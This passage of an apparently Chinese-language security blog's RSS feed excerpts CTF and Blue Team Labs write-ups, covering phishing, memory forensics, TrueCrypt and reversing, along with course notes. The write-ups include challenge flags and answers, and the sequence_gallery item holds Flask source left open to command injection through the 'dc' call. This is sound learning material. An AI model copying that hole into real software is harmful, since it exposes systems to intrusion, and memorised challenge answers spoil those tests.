Scenario A user has received a phishing email and forwarded it to the SOC. Can you investigate the email and attachment to collect useful artifacts?
Tools Text Editor Mozilla Thunderbird URL2PNG WHOis
==Q1== Who is the primary recipient of this email?
Recon 這一題可以直接用線上工具 - EML Viewer把eml file轉成pdf，不過風險就是有很多的資訊會流失掉，所以比較好的方式就是直接裝Mozilla Thunderbird查看 :::spoiler Flag Flag: kinnar1975@yahoo.co.uk :::</description></item><item><title>BTLO - Secrets</title><link>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---secrets/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---secrets/index.html</guid><description>BTLO - Secrets Challenge: https://blueteamlabs.online/home/challenge/secrets-85aa2bb3a9
:::spoiler TOC [TOC] :::
Scenario You’re a senior cyber security engineer and during your shift, we have intercepted/noticed a high privilege actions from unknown source that could be identified as malicious. We have got you the ticket that made these actions. You are the one who created the secret for these tickets. Please fix this and submit the low privilege ticket so we can make sure that you deserve this position. Here is the ticket:</description></item><item><title>BTLO - Shiba Insider</title><link>https://bernie6401.github.io/security/practice/btlo/digital-forensic/btlo---shiba-insider/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/digital-forensic/btlo---shiba-insider/index.html</guid><description>BTLO - Shiba Insider Challenge: https://blueteamlabs.online/home/challenge/shiba-insider-5b48123711
:::spoiler TOC [TOC] :::
Tools Wireshark CyberChef Steghide Command Line Exiftool
==Q1== What is the response message obtained from the PCAP file?
Recon 這一題首先看到一個pcap file，以及zip file，不過zip file需要密碼才能unzip，所以先看pcap file有沒有相關訊息
這個流量紀錄非常簡單，就是一個簡單的tcp connection，包含前面的三向交握以及get packet，交換完訊息之後當然就是要finish conversation，所以重點在中間他們交換的訊息 傳回來的訊息說: use your own password，其實也就是該題的答案
:::spoiler Flag Flag: use your own password :::
==Q2== What is the password of the ZIP file?
Recon 呈上題，我們看到他給的提示後，往上看他的Authorization其實是個base64 encode的可疑資訊，decode之後發現是個username:password的資訊→==fakeblue:redforever==</description></item><item><title>CGGC 2023 初賽</title><link>https://bernie6401.github.io/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/cggc-2023-%E5%88%9D%E8%B3%BD/index.html</guid><description>CGGC 2023 初賽 隊名: 王凡補習班 名次 這一次參賽雖然打出來的不多，但重點還是有學到很多東西，感謝@davidchen學長帶我飛，我覺得互相交流之後的這種隱形的貢獻也是很重要的 GaoYi Source code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] setvbuf(stdout, 0LL, 2LL, 0LL); puts(TITLE); puts("Welcome to the Charitable Lag Vegas!"); puts("Anyone can participate with three million US dollars."); puts("You play with 52 cards with (S)pades, (C)lub, (H)earts, (D)iamond."); puts("[+] Game 1: Predict the first 8 cards I draw in exact order."); puts("[+] Input example: \"C8\"."); v47 = 0; for ( i = 0; i &lt;= 7; ++i ) { printf((unsigned int)"Card %c: ", i + 49, v3, v4, v5, v6, flag[0]); fgets(&amp;input[32 * i], 32LL, stdin); if ( !(unsigned int)isACard((__int64)&amp;input[32 * i]) ) --v47; } for ( j = 0; j &lt;= 7; ++j ) { if ( (unsigned __int64)j_strlen_ifunc(&amp;input[32 * j]) > 1 ) { v7 = j == 7 &amp;&amp; input[224] == 'H'; v8 = !j &amp;&amp; input[2] == '0'; v9 = v8 + v7; v10 = j == 1 &amp;&amp; input[32] == 'S'; v11 = v10 + v9; v12 = !j &amp;&amp; input[0] == 'H'; v13 = v12 + v11; v14 = j == 1 &amp;&amp; input[33] == '2'; v15 = v14 + v13; v16 = j == 4 &amp;&amp; input[129] == '7'; v17 = v16 + v15; v18 = j == 2 &amp;&amp; input[64] == 'C'; v19 = v18 + v17; v20 = j == 3 &amp;&amp; input[96] == 'S'; v21 = v20 + v19; v22 = j == 6 &amp;&amp; input[192] == 'H'; v23 = v22 + v21; v24 = j == 2 &amp;&amp; input[65] == '8'; v25 = v24 + v23; v26 = j == 3 &amp;&amp; input[97] == '5'; v27 = v26 + v25; v28 = j == 5 &amp;&amp; input[160] == 'S'; v29 = v28 + v27; v30 = j == 4 &amp;&amp; input[128] == 'S'; v31 = v30 + v29; v32 = j == 5 &amp;&amp; input[161] == 'A'; v33 = v32 + v31; v34 = j == 6 &amp;&amp; input[193] == '2'; v35 = v34 + v33; v36 = j == 7 &amp;&amp; input[225] == 'A'; v44 = v35 + v36; v47 += v35 + v36; } else { --v47; } } if ( v47 > 15 ) { puts("[+] Stage 2: Predict the final card I draw."); fgets(flag, 32LL, stdin); if ( (unsigned int)isACard((__int64)flag) &amp;&amp; (unsigned __int64)j_strlen_ifunc(flag) > 1 &amp;&amp; flag[0] == 'H' &amp;&amp; flag[1] == '2' ) { printf((unsigned int)"Congrats! Here is your flag: ", 32, v38, v39, v40, v41, flag[0]); readFlag(); return 0; } else { puts("You failed."); return 0; } } else { puts("You failed."); return 0; } } :::</description></item><item><title>CrewCTF - :-1: Questions</title><link>https://bernie6401.github.io/security/practice/crewctf/bad/crewctf---_-1_-questions/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/bad/crewctf---_-1_-questions/index.html</guid><description>Challenge: findme Source :::spoiler :::
Recon 這一題就只是找一張照片的經緯度，不二法門就是慢慢找，真TM累
Exploit Flag: crew{35.6682,138.5699}</description></item><item><title>CrewCTF - Attaaaaack 1-13</title><link>https://bernie6401.github.io/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/index.html</guid><description>CrewCTF - Attaaaaack 1-13 :::spoiler TOC [TOC] :::
One of our employees at the company complained about suspicious behavior on the machine, our IR team took a memory dump from the machine and we need to investigate it.
==Attaaaaack 1== Q1. What is the best profile for the the machine?
Exploit $ volatility_2.6_win64_standalone.exe -f memdump.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (D:\NTU\CTF\CrewCTF\Misc\Attaaaaack\memdump.raw) PAE type : PAE DTB : 0x185000L KDBG : 0x82b7ab78L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0x80b96000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2023-02-20 19:10:54 UTC+0000 Image local date and time : 2023-02-20 21:10:54 +0200 Flag: crew{Win7SP1x86_23418}</description></item><item><title>CrewCTF - Encrypt10n(Part 1)</title><link>https://bernie6401.github.io/security/practice/crewctf/misc/crewctf---encrypt10npart-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/misc/crewctf---encrypt10npart-1/index.html</guid><description>CrewCTF - Encrypt10n(Part 1) Background Volatility 3
Recon Description: We made a memory dump on the criminal machine after entering the crime scene. Our investigator thought he was using encryption software to hide the secret. can you help me to detect it? Q1 : crew{password} 這種類型之前沒碰過，所以看了別人的WP學一下1 首先他有提到他有用加密的技術隱藏secret，所以我們的目的就是要找到password Exploit - Memory Forensics 先找到運行的OS version或其他軟硬體資訊 $ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/mnt/d/Download/Trash/dump.raw) PAE type : PAE DTB : 0x185000L KDBG : 0x82b3db78L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0x839a5000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2023-02-16 12:03:16 UTC+0000 Image local date and time : 2023-02-16 14:03:16 +0200 重點: Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 列出當時系統正在運行的process $ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw pslist --profile=Win7SP0x86 Volatility Foundation Volatility Framework 2.6.1 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x8413a938 System 4 0 88 520 ------ 0 2023-02-16 12:00:48 UTC+0000 0x84e481c8 smss.exe 252 4 2 29 ------ 0 2023-02-16 12:00:49 UTC+0000 0x84cae358 csrss.exe 340 324 8 550 0 0 2023-02-16 12:00:53 UTC+0000 0x844ea030 wininit.exe 392 324 3 77 0 0 2023-02-16 12:00:54 UTC+0000 0x84ef5030 csrss.exe 400 384 9 223 1 0 2023-02-16 12:00:54 UTC+0000 0x8573dd20 winlogon.exe 456 384 6 114 1 0 2023-02-16 12:00:54 UTC+0000 0x85749868 services.exe 496 392 8 228 0 0 2023-02-16 12:00:54 UTC+0000 0x85763030 lsass.exe 508 392 7 578 0 0 2023-02-16 12:00:55 UTC+0000 0x85764030 lsm.exe 516 392 10 149 0 0 2023-02-16 12:00:55 UTC+0000 0x857bd510 svchost.exe 624 496 11 362 0 0 2023-02-16 12:00:56 UTC+0000 0x85809510 svchost.exe 704 496 7 298 0 0 2023-02-16 12:00:56 UTC+0000 0x85859920 svchost.exe 784 496 23 510 0 0 2023-02-16 12:00:56 UTC+0000 0x8586da80 svchost.exe 832 496 15 265 0 0 2023-02-16 12:00:57 UTC+0000 0x85872bb0 svchost.exe 856 496 22 731 0 0 2023-02-16 12:00:57 UTC+0000 0x85875460 svchost.exe 880 496 47 1013 0 0 2023-02-16 12:00:57 UTC+0000 0x8588f370 audiodg.exe 960 784 6 132 0 0 2023-02-16 12:00:57 UTC+0000 0x858c2420 svchost.exe 1092 496 18 389 0 0 2023-02-16 12:00:58 UTC+0000 0x857d6030 spoolsv.exe 1288 496 15 270 0 0 2023-02-16 12:00:59 UTC+0000 0x857d1030 dwm.exe 1296 832 6 114 1 0 2023-02-16 12:00:59 UTC+0000 0x857c7030 svchost.exe 1324 496 21 310 0 0 2023-02-16 12:00:59 UTC+0000 0x857a5d20 explorer.exe 1384 1276 33 923 1 0 2023-02-16 12:00:59 UTC+0000 0x857c4d20 taskhost.exe 1400 496 10 197 1 0 2023-02-16 12:00:59 UTC+0000 0x85837898 svchost.exe 1560 496 11 146 0 0 2023-02-16 12:01:00 UTC+0000 0x841d1030 VGAuthService. 1720 496 4 85 0 0 2023-02-16 12:01:01 UTC+0000 0x841d7118 vmtoolsd.exe 1736 1384 10 181 1 0 2023-02-16 12:01:02 UTC+0000 0x85856030 vm3dservice.ex 1836 496 5 60 0 0 2023-02-16 12:01:03 UTC+0000 0x85857d20 vmtoolsd.exe 1856 496 14 291 0 0 2023-02-16 12:01:03 UTC+0000 0x841e5678 vm3dservice.ex 1880 1836 3 44 1 0 2023-02-16 12:01:03 UTC+0000 0x85a26030 svchost.exe 384 496 8 93 0 0 2023-02-16 12:01:05 UTC+0000 0x85a6e5d0 dllhost.exe 876 496 21 191 0 0 2023-02-16 12:01:05 UTC+0000 0x85941c28 dllhost.exe 1744 496 18 200 0 0 2023-02-16 12:01:05 UTC+0000 0x85ab6260 msdtc.exe 1128 496 15 154 0 0 2023-02-16 12:01:06 UTC+0000 0x85ac8b00 WmiPrvSE.exe 232 624 10 193 0 0 2023-02-16 12:01:06 UTC+0000 0x841f4470 SearchIndexer. 2148 496 14 604 0 0 2023-02-16 12:01:08 UTC+0000 0x85b2a030 VSSVC.exe 2276 496 7 118 0 0 2023-02-16 12:01:11 UTC+0000 0x85b80cb8 SearchProtocol 2372 2148 9 284 0 0 2023-02-16 12:01:13 UTC+0000 0x85b855f8 SearchFilterHo 2392 2148 6 104 0 0 2023-02-16 12:01:13 UTC+0000 0x85b97d20 svchost.exe 2480 496 15 232 0 0 2023-02-16 12:01:15 UTC+0000 0x85bc5398 wmpnetwk.exe 2632 496 11 212 0 0 2023-02-16 12:01:16 UTC+0000 0x85bba030 WmiPrvSE.exe 2860 624 15 319 0 0 2023-02-16 12:01:25 UTC+0000 0x85c53030 WmiApSrv.exe 3004 496 6 112 0 0 2023-02-16 12:01:30 UTC+0000 0x85c596c0 TrueCrypt.exe 3196 1384 2 67 1 0 2023-02-16 12:02:07 UTC+0000 0x84d54d20 sppsvc.exe 3736 496 6 154 0 0 2023-02-16 12:03:05 UTC+0000 0x84d567f0 svchost.exe 3776 496 15 353 0 0 2023-02-16 12:03:05 UTC+0000 0x844fcd20 DumpIt.exe 4072 1384 2 38 1 0 2023-02-16 12:03:14 UTC+0000 0x844ba6e0 conhost.exe 4080 400 2 51 1 0 2023-02-16 12:03:14 UTC+0000 重點：0x85c596c0 TrueCrypt.exe 3196 1384 2 67 1 0 2023-02-16 12:02:07 UTC+0000 TrueCrypt - Wiki TrueCrypt是一款已停止開發的動態（On-the-fly）磁碟加密軟體，支援Windows、macOS和Linux作業系統。它可在單個檔案和磁碟分割區中建立加密區，也可以加密整個作業系統，解密後使用者即可像普通分割區一樣使用其中的檔案。TrueCrypt支援使用密碼、金鑰檔案作為解密憑據。</description></item><item><title>CrewCTF - Encrypt10n(Part 2)</title><link>https://bernie6401.github.io/security/practice/crewctf/misc/crewctf---encrypt10npart-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/misc/crewctf---encrypt10npart-2/index.html</guid><description>CrewCTF - Encrypt10n(Part 2) Background How To Open A TrueCrypt Container Using cryptsetup
$ sudo cryptsetup --type tcrypt open container-to-mount container-name
什麽是塊設備，什麽是字符設備？有什麽區別？
Recon 這一題應該是沿用part 1得到的密碼進行解密
Exploit 用cryptsetup1先進行解密
$ sudo cryptsetup --type tcrypt open flag flag_decrypt Enter passphrase for flag: 則輸出的結果就是一個container儲存在/dev/mapper，可以看到它是一個block device
$ ll /dev/mapper total 0 drwxr-xr-x 2 root root 80 Jul 12 21:44 . drwxr-xr-x 11 root root 3140 Jul 12 21:44 .. crw------- 1 root root 10, 236 Jul 11 23:06 control brw-rw---- 1 root disk 252, 3 Jul 12 21:44 flag_dec 再來就要把這個container掛起來，要掛起來才能讀取裡面的資料</description></item><item><title>CrewCTF - ez rev</title><link>https://bernie6401.github.io/security/practice/crewctf/reverse/crewctf---ez-rev/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/reverse/crewctf---ez-rev/index.html</guid><description>CrewCTF - ez rev Source Code :::spoiler IDA Fake Main Function
void __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+Ch] [rbp-4h] puts("[+] Another flag checker..."); fgets(byte_4200E0, 256, stdin); if ( byte_4200E0[strlen(byte_4200E0) - 1] == 10 ) byte_4200E0[strlen(byte_4200E0) - 1] = 0; for ( i = 0; i &lt;= 73; ++i ) { if ( byte_4200E0[i] != (byte_420060[i] ^ 0x70) ) sub_401220(); } sub_401202(); } :::
Recon 首先這一題真的太難了，超出我的守備範圍，所以我先寫一些當作紀錄，之後可以更快銜接繼續解
首先可以執行一下，如果是在Ubuntu 20.04(預設Libc版本是2.31)的版本和其他版本會有不一樣的output
$ ldd --version ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31 Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. $ ./a.out [+] Another flag checker... 123456 [-] No :( $ ldd --version ldd (Ubuntu GLIBC 2.35-0ubuntu3) 2.35 Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. ./a.out [+] Another flag checker... 123456 [-] Why you still here 這是因為他和這隻程式執行的過程有關係</description></item><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/index.html</guid><description>CrewCTF - sequence_gallery Background Command Injection dc command in Linux with examples Linux dc命令
dc -h Usage: dc [OPTION] [file …] -e, –expression=EXPR evaluate expression -f, –file=FILE evaluate contents of file -h, –help display this help and exit -V, –version output version information and exit
Email bug reports to: bug-dc@gnu.org .
Source Code :::spoiler Source Code
import os import sqlite3 import subprocess from flask import Flask, request, render_template app = Flask(__name__) @app.get('/') def index(): sequence = request.args.get('sequence', None) if sequence is None: return render_template('index.html') script_file = os.path.basename(sequence + '.dc') if ' ' in script_file or 'flag' in script_file: return ':(' proc = subprocess.run( ['dc', script_file], capture_output=True, text=True, timeout=1, ) output = proc.stdout return render_template('index.html', output=output) if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) :::</description></item><item><title>Cryptography and Network Security - Final Project</title><link>https://bernie6401.github.io/security/course/ntu-cns/cryptography-and-network-security---final-project/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/cryptography-and-network-security---final-project/index.html</guid><description>Cryptography and Network Security - Final Project Threshold HE Description With a designed scheme in place for threshold homomorphic encryption, private keys are divided into various shares among participating individuals who then work together to collaborate on computations without revealing plaintext material.
Decryption requires collaboration from at least the minimum requirement, e.g. $(t,n)$ means there’re $n$ participate parties but need at least $t$ parties’ granting to decrypt the secret just like secret sharing scheme proposed by Shamir. Threshold homomorphic’s primary objective is secure computation involving confidential information with lesser exposure or accessibility risks for single individuals - due to a shared understanding by several stakeholders.</description></item><item><title>Cryptography and Network Security - Regular Critique 2</title><link>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/index.html</guid><description>Cryptography and Network Security - Regular Critique 2 Reading Topic: A key-management scheme for distributed sensor networks tags: NTUCNS Name: 何秉學	Student ID: R11921A16
Summary Distributed Sensor Networks (DSNs) are quite different from traditional embedded system networks, such as the number of nodes. Therefore, the security of the communication between each node is crucial. However, the storage capacity and computation capability of each node is the shallow level which is not enough to handle. So, we can’t use high computing power techniques such as asymmetric cipher (RSA) to deal with it. In contrast, they decided to use a symmetric cipher system to implement it and focus the point on how to manage and keep the key safe. This paper aimed to address the number of keys that each node in DSNs has too much. For example, if the number of nodes in DSN is n, then each node has to keep n-1 shared keys for connecting. This is not a good plan to implement. Overall, they proposed a brand-new key management scheme for large-scale DSNs and attempt to find the balance between safety and efficiency. In addition, according to the simulation result, they found out the comparison is highly better than the traditional key pre-distribution scheme.</description></item><item><title>Cryptography and Network Security – Comparative Critique 1</title><link>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/index.html</guid><description>Cryptography and Network Security – Comparative Critique 1 Reading Topic: Reflections on trusting distributed trust Reading Topic: Reflections on Trusting Trust tags: NTUCNS Name: 何秉學	Student ID: R11921A16
:::spoiler Background 什麼是 Intel® SGX？
提供以硬體為基礎的記憶體加密功能，可在記憶體內隔離特定的應用程式碼與資料。Intel® SGX 允許將使用者層級的程式碼配置於記憶體中的隱私區域，這稱為「指定位址空間」(enclave)，其設計是為了在較高權限層級的執行程序中受到保護
What is firefox Telemetry
這個功能對 Mozilla 工程師來說很有幫助，它可以幫助工程師了解 Firefox 實際的運作狀況。Telemetry 會傳送使用量及體驗的資訊給 Mozilla。當您使用 Firefox 時，Telemetry 就會測量與收集與個人隱私無關的資訊，例如記憶體消耗、反應時間和各種功能的使用頻率。這些資訊會每天例行傳送給 Mozilla 利用，讓 Firefox 越來越完善。
Let’s Encrypt &amp; ISRG
Let’s Encrypt 是免費、自動化和開放的憑證頒發機構，由非營利組織網路安全研究小組 (Internet Security Research Group, ISRG) 營運。</description></item><item><title>Cryptography and Network Security – Comparative Critique 2</title><link>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/index.html</guid><description>Cryptography and Network Security – Comparative Critique 2 Reading Topic: The Password Reset MitM Attack Reading Topic: Is Real-time Phishing Eliminated with FIDO? Social Engineering Downgrade Attacks against FIDO Protocols tags: NTUCNS Name: 何秉學	Student ID: R11921A16
Background Downgrade Attack FIDO 是什麼？ Topic 1 Translation
Summary of paper 1 The Password Reset MitM Attack" paper aims to address a security vulnerability in the password reset process that allows attackers to intercept a victim’s password reset link and gain access to their account. This problem matters because attackers can compromise personal information and sensitive data. The paper presents the Password Reset Man-in-the-Middle (PRMitM) attack and proposes several defenses to mitigate the risk, including challenge-response protocols and additional authentication factors. The authors conclude that PRMitM attacks are a significant threat to online account security, and suggest implementing additional security measures and informing users of the risks to strengthen the security of their accounts.</description></item><item><title>Cryptography and Network Security – Comparative Critique 3</title><link>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/index.html</guid><description>Cryptography and Network Security – Comparative Critique 3 Reading Topic: DNSSEC VS DoH(DNS-over-HTTPS) tags: NTUCNS Name: 何秉學	Student ID: R11921A16
Background 什麼是 DNSSEC？
什麼是 DNSSEC？
網域名稱系統安全性擴充 (DNSSEC) 可為網域名稱的 DNS (網域名稱系統) 加上電子簽名，藉此判斷來源網路名稱的真實性。此功能可以保護網路使用者不受假造 DNS 資料的威脅，讓使用者要求正確網址時不會取得其他有意誤導或惡意製作的網址。
啟用 DNSSEC 後，DNS 查閱會使用電子簽名驗證網站 DNS 來源是否有效，這樣做可以協助防止受到特定類型的攻擊，而當電子簽名不一致的時候，瀏覽器便不會顯示網站。
What is DNS Cache Poisoning? - 小心網域名稱伺服器快取毒害(DNS cache poisoning)攻擊
簡單的說，DNS 通常都會實做快取(Cache)功能，若 DNS 收到來自惡意假造的 DNS 封包，導致將錯誤的 Domain Name v.s. IP 對應資料快取在 DNS Server 中，就會讓使用這台 DNS Server 的使用者連結到錯誤的 IP，這將會是個十分嚴重的安全性漏洞！而這樣的安全性漏洞就稱之為 DNS cache poisoning</description></item><item><title>Cryptography and Network Security – Homework 1</title><link>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/index.html</guid><description>Cryptography and Network Security – Homework 1 tags: NTUCNS :::spoiler TOC [TOC] ::: :::info Official Solution ::: Student ID: R11921A16 Name: 何秉學
Handwriting 1. CIA Ans: Confidentiality means all of the sensitive messages or information that can be protected so that just the people who have the authentication can edit or browse the information.
Integrity refers to the completeness of the message you transferred and ensured that the message is not altered by an unauthenticated person.</description></item><item><title>Cryptography and Network Security – Homework 2</title><link>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/index.html</guid><description>Cryptography and Network Security – Homework 2 tags: NTUCNS :::spoiler TOC [TOC] ::: Student ID: R11921A16 Name: 何秉學
Handwriting 1. SYN Cookies Ans: This strategy involves the creation of a cookie by the server. In order to avoid the risk of dropping connections when the backlog has been filled, the server responds to each connection request with a SYN-ACK packet but then drops the SYN request from the backlog, removing the request from memory and leaving the port open and ready to make a new connection. If the connection is a legitimate request, and a final ACK packet is sent from the client machine back to the server, the server will then reconstruct (with some limitations) the SYN backlog queue entry. While this mitigation effort does lose some information about the TCP connection, it is better than allowing denial-of-service to occur to legitimate users as a result of an attack.</description></item><item><title>Cryptography and Network Security – Homework 3</title><link>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/index.html</guid><description>Cryptography and Network Security – Homework 3 tags: NTUCNS :::spoiler TOC [TOC] :::
1. DDoS 1) Hint: You can use I/O Graphs to find the time that the flow starts to burst. Then you can find the first packet near there.
Ans: Using I/O graph in Statistic/I/O Graphs in wireshark, then you can figure out the whole trend of this network flow. :::spoiler Result Screenshot ::: Also, you can set the different scale of the graph and figure out the attack time precisely. I set the Interval=100ms and find the increasing time at 24.8s which is No.55862 packet shown as below. :::spoiler Result Screenshot ::: Thus, the attack time should be at 24.945277 and the victim is 192.168.232.95 :::spoiler Result Screenshot :::</description></item><item><title>Cryptography and Network Security – HW0</title><link>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/index.html</guid><description>Cryptography and Network Security – HW0 Reading Topic: The Tangled Web of Password Reuse tags: NTUCNS Name: 何秉學	Student ID: R11921A16
Summary Password security is a critical issue that we may pay attention. However, most people choose easy-remembered strings as their online-service password, which may cause the users to re-used the password as a different online service. Unfortunately, the number of network attacks is increasing, and attackers contain tons of users’ information including re-used passwords. They tried to propose a guessing password algorithm including character sequence, deletions, insertion, capitalization, reversal, leet-speak, and substring movement to guess a series of candidate passwords that users may use at different websites according to a set of leaked passwords. Their prototype guessing algorithm is able to crack approximately 10% of the nonidentical password pairs in less than 10 attempts and approximately 30% such pairs in less than 100 attempts.</description></item><item><title>Cryptography and Network Security – Regular Critique 3</title><link>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/index.html</guid><description>Cryptography and Network Security – Regular Critique 3 Reading Topic: Automated Detection of IPv6 Privacy Leakage in Home Networks tags: NTUCNS Name: 何秉學	Student ID: R11921A16
Background What is Customer Premise Equipment? - 用戶終端設備(CPE)
英文名稱為Customer Premise Equipment，是指網路連接至用戶端的相關設備，包括數據機、寬頻路由器、寬頻閘道器等，但隨著電信網路應用服務逐漸多元化，只要是用戶端所使用的網路服務設備，都可稱為CPE裝置，包括VoIP閘道器、IP phone、雙模手機、IP STB等。
What is EUI-64?
IPv6 Address太長，要網管人員逐個Interface設定IPv6 Address肯定是件痛苦的事。EUI-64讓我們只需幫Interface试定Prefix部份,然後Interface就會用MAC Address自動產生Interface ID，基於MAC Address 獨一無二，利用 EUI-64 必能生成獨一無二的 IPv6 Address。EUI-64 產生 Interface ID 的辦法是先把MAC Address （共48 Bits）斬開兩等份.中間插入FFFE供16 Bits），使其成為64 Bits，然後把第7 Bit由0改成1。最後在前面加上Prefix歟成為一組IPv6 Address 了。</description></item><item><title>Cryptography and Network Security – Regular Critique 4</title><link>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/index.html</guid><description>Cryptography and Network Security – Regular Critique 4 Reading Topic: Dos and Don’ts of Machine Learning in Computer Security tags: NTUCNS Name: 何秉學	Student ID: R11921A16
Summary In this paper, they tried to point out some pitfalls of computer security paper that are associated with machine learning. Especially the paper in the last 10 years published at top-tier conferences. In addition, they identify 10 common pitfalls such as sampling bias problems, label inaccuracy, data snooping problems, spurious correlations, etc that are associated with the whole machine learning workflow, i.e. data collection and labeling, system design and learning, performance evaluation and deployment, and operation. They also provide some recommendations and some remedies and try to mitigate the threat. The top 3 pitfalls in their research are sampling bias, data snooping, and lab-only evaluation.</description></item><item><title>Cryptography Lec 1(Overview) - Notes</title><link>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-1overview---notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-crypto/cryptography-lec-1overview---notes/index.html</guid><description>Cryptography Lec 1(Overview) - Notes tags: Cryptography NTU Background Chosen Plaintext Attack(CPA security) Attacker只可以拿到plaintext相對應的ciphertext，通常是在同一把key重複使用的情況下
Chosen Cipnertext Attack(CCA security) Attacker不只可以拿到plaintext相對應的ciphertext，他也可以知道ciphertext相對應的plaintext，進而得知很多額外的資訊
